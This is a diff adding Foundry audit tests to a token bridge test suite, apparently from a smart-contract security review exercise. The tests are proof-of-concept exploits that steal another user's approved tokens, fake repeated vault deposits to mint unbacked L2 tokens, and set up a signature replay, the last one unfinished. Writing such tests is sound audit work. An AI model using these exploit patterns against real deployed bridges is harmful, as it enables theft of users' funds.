@@ -17,6 +17,7 @@ contract L1BossBridgeTest is Test {
     address user = makeAddr("user");
     address userInL2 = makeAddr("userInL2");
     Account operator = makeAccount("operator");
+    // Accounts in foundry come with operator.key and operator.addr
 
     L1Token token;
     L1BossBridge tokenBridge;
@@ -223,4 +224,86 @@ contract L1BossBridgeTest is Test {
     {
         return vm.sign(privateKey, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
     }
+
+
+    /*//////////////////////////////////////////////////////////////
+                           Audit tests
+    //////////////////////////////////////////////////////////////*/
+
+    function testCanStealApprovedTokensFromOtherUsers() public {
+        vm.prank(user); // Alice approving the bridge to spend her tokens
+        token.approve(address(tokenBridge), type(uint256).max);
+
+        // Bob stealing money
+        uint256 depositAmount = token.balanceOf(user);
+        address attacker = makeAddr("attacker");
+        vm.startPrank(attacker);
+
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(user, attacker, depositAmount);
+        // Bob steals Alice's tokens - funds are sent to Bob on the L2
+        tokenBridge.depositTokensToL2(user, attacker, depositAmount);
+
+        assertEq(token.balanceOf(user), 0); 
+        assertEq(token.balanceOf(address(vault)), depositAmount);
+        vm.stopPrank();
+    }
+
+    // test if we can infinitely transfer funds from the vault to the vault emiting events allowing us to infinitely mint tokens on the L2
+    function testCanTransferFromVaultToVault() public {
+        address attacker = makeAddr("attacker");
+        vm.startPrank(attacker);
+
+        uint256 vaultBalance = 500 ether;
+        deal(address(token), address(vault), vaultBalance); // put tokens in the vault
+
+        // Can trigger the deposit event when we self transfer events from vault to vault
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(address(vault), attacker, vaultBalance); // q this tells foundry what event to expect in the following call!
+        tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance); 
+
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(address(vault), attacker, vaultBalance); // q this tells foundry what event to expect in the following call!
+        tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance); 
+
+    }
+
+    // test if an attacker can re-use the v, r, s signature
+    function testSignatureReplay() public {
+        // assume the attacker and vault already holds some tokens
+        uint256 vaultInitialBalance = 1000e18;
+        deal(address(token), address(vault), vaultInitialBalance);
+
+        uint256 attackerInitialBalance = 100e18;
+        address attacker = makeAddr("attacker");
+        deal(address(token), address(attacker), attackerInitialBalance);
+
+        // An attacker deposits tokens to L2
+        vm.startPrank(attacker);
+        token.approve(address(tokenBridge), type(uint256).max);
+
+        // attacker deposits tokens to L2
+        tokenBridge.depositTokensToL2(attacker, attacker, attackerInitialBalance);
+        
+        // The signer/operator is going to sign the withdrawal on L2
+        // This is the message:
+        bytes memory message = abi.encode(
+            address(token), 
+            0, 
+            abi.encodeCall(
+                IERC20.transferFrom, 
+                (address(vault), attacker, attackerInitialBalance)
+            )
+        );
+        // This is the message, signed with the operator's keys and returning the v, r, s components of the signed message
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(
+            operator.key, //operator private key
+            MessageHashUtils.toEthSignedMessageHash( // message formated to EIP-191
+                keccak256(message)
+            )
+        );
+
+
+    }
+
 }
